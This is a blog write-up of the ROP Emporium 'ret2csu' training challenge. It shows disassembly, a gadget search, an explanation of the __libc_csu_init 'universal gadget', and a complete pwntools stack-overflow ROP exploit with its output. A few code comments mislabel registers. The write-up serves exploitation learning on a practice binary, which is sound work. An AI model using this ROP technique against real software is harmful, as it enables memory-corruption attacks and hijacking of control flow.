---
title: "ROP Emporium Ret2CSU Writeup"
date: 2020-01-04T21:28:48+03:00
draft: false
description: Last ROP Emporium callenge - [Ret2CSU](https://ropemporium.com/challenge/ret2csu.html)! This challenge requires a usage of something called Universal Gadget, that will allow us to use three parameters to functions calls, when we do not have any useful gadgets available to us. Our goal is to call the `ret2win` function with `rdx` filled with `0xdeadcafebabebeef`. As mentioned before, the main challenge here is having no gadgets allowing us to directly control `rdx`.
tags:
    - binary-exploitation
    - pwning
    - rop
---

Last ROP Emporium callenge - [Ret2CSU](https://ropemporium.com/challenge/ret2csu.html)! This challenge requires a usage of something called Universal Gadget, that will allow us to use three parameters to functions calls, when we do not have any useful gadgets available to us.

Our goal is to call the `ret2win` function with `rdx` filled with `0xdeadcafebabebeef`. As mentioned before, the main challenge here is having no gadgets allowing us to directly control `rdx`.

```bash
pwndbg> checksec
[*] '/home/adamgold/Desktop/ctfs/ret2csu/ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

pwndbg> disass main
Dump of assembler code for function main:
   0x00000000004006d7 <+0>:	push   rbp
   0x00000000004006d8 <+1>:	mov    rbp,rsp
   0x00000000004006db <+4>:	mov    rax,QWORD PTR [rip+0x20097e]        # 0x601060 <stdout@@GLIBC_2.2.5>
   0x00000000004006e2 <+11>:	mov    ecx,0x0
   0x00000000004006e7 <+16>:	mov    edx,0x2
   0x00000000004006ec <+21>:	mov    esi,0x0
   0x00000000004006f1 <+26>:	mov    rdi,rax
   0x00000000004006f4 <+29>:	call   0x4005e0 <setvbuf@plt>
   0x00000000004006f9 <+34>:	mov    edi,0x4008c8
   0x00000000004006fe <+39>:	call   0x400590 <puts@plt>
   0x0000000000400703 <+44>:	mov    eax,0x0
   0x0000000000400708 <+49>:	call   0x400714 <pwnme>
   0x000000000040070d <+54>:	mov    eax,0x0
   0x0000000000400712 <+59>:	pop    rbp
   0x0000000000400713 <+60>:	ret
End of assembler dump.
pwndbg> disass pwnme
Dump of assembler code for function pwnme:
   0x0000000000400714 <+0>:	push   rbp
   0x0000000000400715 <+1>:	mov    rbp,rsp
   0x0000000000400718 <+4>:	sub    rsp,0x20
   0x000000000040071c <+8>:	lea    rax,[rbp-0x20]
   0x0000000000400720 <+12>:	mov    edx,0x20
   0x0000000000400725 <+17>:	mov    esi,0x0
   0x000000000040072a <+22>:	mov    rdi,rax
   0x000000000040072d <+25>:	call   0x4005c0 <memset@plt>
   0x0000000000400732 <+30>:	mov    edi,0x4008e1
   0x0000000000400737 <+35>:	call   0x400590 <puts@plt>
   0x000000000040073c <+40>:	mov    edi,0x4008f0
   0x0000000000400741 <+45>:	call   0x400590 <puts@plt>
   0x0000000000400746 <+50>:	mov    edi,0x400924
   0x000000000040074b <+55>:	call   0x400590 <puts@plt>
   0x0000000000400750 <+60>:	mov    edi,0x400925
   0x0000000000400755 <+65>:	mov    eax,0x0
   0x000000000040075a <+70>:	call   0x4005b0 <printf@plt>
   0x000000000040075f <+75>:	mov    eax,0x601018
   0x0000000000400764 <+80>:	mov    QWORD PTR [rax],0x0
   0x000000000040076b <+87>:	mov    eax,0x601028
   0x0000000000400770 <+92>:	mov    QWORD PTR [rax],0x0
   0x0000000000400777 <+99>:	mov    eax,0x601030
   0x000000000040077c <+104>:	mov    QWORD PTR [rax],0x0
   0x0000000000400783 <+111>:	mov    rdx,QWORD PTR [rip+0x2008e6]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x000000000040078a <+118>:	lea    rax,[rbp-0x20]
   0x000000000040078e <+122>:	mov    esi,0xb0
   0x0000000000400793 <+127>:	mov    rdi,rax
   0x0000000000400796 <+130>:	call   0x4005d0 <fgets@plt>
   0x000000000040079b <+135>:	mov    eax,0x601038
   0x00000000004007a0 <+140>:	mov    QWORD PTR [rax],0x0
   0x00000000004007a7 <+147>:	mov    rdi,0x0
   0x00000000004007ae <+154>:	nop
   0x00000000004007af <+155>:	leave
   0x00000000004007b0 <+156>:	ret
End of assembler dump.
```

Looking at the disassembly, this challenge is pretty much the same as earlier challenges. We need to overflow the buffer in `pwnme`, return to `ret2win` BUT change `rdx` first. Let's hunt for gadgets:

```bash
adamgold@adamgold-VirtualBox:~/Desktop/ctfs/ret2csu$ ropper --file ret2csu --search "pop rdx"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdx
```

I tried searching for more rdx-related gadgets but could not find any. After struggling with this for some time, I discovered something I was unfamiliar with - [Universal gadgets](https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html).

> \_\_libc_csu_init functions provides a few nice gadgets to load data into certain critical registers. Most importantly EDI, RSI and RDX.

That's perfect! Let's get these gadgets from the disassembly of the file:

```bash
objdump -d ./ret2csu -M intel

0000000000400840 :

400880:    4c 89 fa                 mov    rdx,r15

  400883:    4c 89 f6                 mov    rsi,r14

  400886:    44 89 ef                 mov    edi,r13d

  400889:    41 ff 14 dc              call   QWORD PTR [r12+rbx*8]

  40088d:    48 83 c3 01              add    rbx,0x1

  400891:    48 39 dd                 cmp    rbp,rbx

  400894:    75 ea                    jne    400880

  400896:    48 83 c4 08              add    rsp,0x8

  .........


  40089a:    5b                       pop    rbx

  40089b:    5d                       pop    rbp

  40089c:    41 5c                    pop    r12

  40089e:    41 5d                    pop    r13

  4008a0:    41 5e                    pop    r14

  4008a2:    41 5f                    pop    r15

  4008a4:    c3                       ret
```

This allows us to move r15 into `rdx` - But, then there's a call to `[r12+rbx*8]` and a `cmp` instruction right after. We're going to need to use the second section of gadgets shown above to control `r12` and `rbx`, so these instructions won't get in our way.

Here's another useful quote from the article linked to above:

> To effectively use mov rdx,r13 , we have to ensure that `call QWORD PTR [r12+rbx*8]` doesn't SIGSEGV, `cmp rbx,rbp` equals and most importantly value of `RDX` is not altered.

Also noted in the article is that it's possible to use pointers for the `_init` function, located at `&_DYNAMIC`. That's just what we need for `r12`, as we'll zero `rbx` - `call [_init+0*8]`.

```
pwndbg> x/10gx &_DYNAMIC

0x600e20:    0x0000000000000001    0x0000000000000001

0x600e30:    0x000000000000000c    0x0000000000400560

0x600e40:    0x000000000000000d    0x00000000004008b4

0x600e50:    0x0000000000000019    0x0000000000600e10

0x600e60:    0x000000000000001b    0x0000000000000008

```

`0x600e48` contains an address to `0x00000000004008b4`:

```
pwndbg> x/4i 0x00000000004008b4

   0x4008b4 :    sub    rsp,0x8

   0x4008b8 :    add    rsp,0x8

   0x4008bc :    ret
```

Remember that after the call instruction, the program will again pop all registers until reaching the ret instruction. Also, we have `add rsp, 0x8` meaning we need another dummy in the stack. Also, `rbp` and `rbx` must not be equal (because of the `cmp` instruction)!

### Summing Up

Here's the plan:

-   Call first gadget at `0x0040089a`.
-   Pop all desired values.
-   Register R12 = pointer to `__init` address.
-   Register R15 = `0xdeadcafebabebeef`.
-   Register `RBX = 0x0` while `RBP = 0x01`.
-   Use second gadget at address 0x400880 that will put the values at correct registers.
-   Place the address of ret2win function in the stack.

```python
from pwn import *

ret2win =0x00000000004007b1
rdx_val = 0xdeadcafebabebeef
pop_rbx = 0x000000000040089a
mov_rdx_r15 = 0x0000000000400880
dynamic = 0x600e48

def exploit():
    p = process("./ret2csu")
    pause()

    p.recvrepeat(0.2)

    log.info("sending buffer overflow")

    rop = p64(pop_rbx) # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
    rop += p64(0x0) # rbp=0x0
    rop += p64(1)  # so rbp won't equal rbx (cmp rbp, rbx must be false)
    rop += p64(dynamic) # r12
    rop += p64(0) # r13
    rop += p64(0) # r14
    rop += p64(rdx_val) # r15 - our desired rbp value!
    rop += p64(mov_rdx_r15)  # popping everything again - mov rdx, r15; mov rsi, r14; mov rdi, r13d; call [r12+rbx*8]; add rbx, 0x1; cmp rbp, rbx; jne 400880; add rsp, 0x8;
    rop += p64(0)  # because of add rsp,0x8 padding - this is a dummy
    rop += p64(1)  # rbx
    rop += p64(0)  # rbp
    rop += p64(0)  # r12
    rop += p64(0)  # r13
    rop += p64(0)  # r14
    rop += p64(0)  # r15
    rop += p64(ret2win)

    p.sendline("A" * 40 + rop)

    log.success(p.recvall())


if __name__ == "__main__":
    exploit()

```

```python
adamgold@adamgold-VirtualBox:~/Desktop/ctfs/ret2csu$ python exp.py
[+] Starting local process './ret2csu': pid 2046
2046
[*] sending buffer overflow
[+] Receiving all data: Done (33B)
[*] Process './ret2csu' stopped with exit code -11 (SIGSEGV) (pid 2046)
[+] ROPE{********}
```
